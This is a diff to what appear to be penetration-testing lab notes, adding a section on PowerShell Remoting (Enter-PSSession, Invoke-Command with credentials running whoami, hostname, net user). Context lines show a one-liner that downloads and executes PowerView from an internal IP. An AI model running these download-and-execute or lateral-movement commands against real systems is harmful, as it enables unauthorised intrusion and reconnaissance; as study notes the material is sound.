@@ -16,3 +16,9 @@
   ```
   PS C:\Users\s.chisholm.mayorsec\Desktop> iex (New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')
   ```
+
+## Powershell Remoting
+
+- `Enter-PSSession -ComputerName workstation-01`
+- `Enter-PSSession -ComputerName workstation-01 -Credential domain\Username`
+- ` Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName workstation-01 -Credential domain\Username` connect to a remote powershell and excute command with ScriptBlock. other command we could do with scriptblock: `ipconfig`, `net user`,...
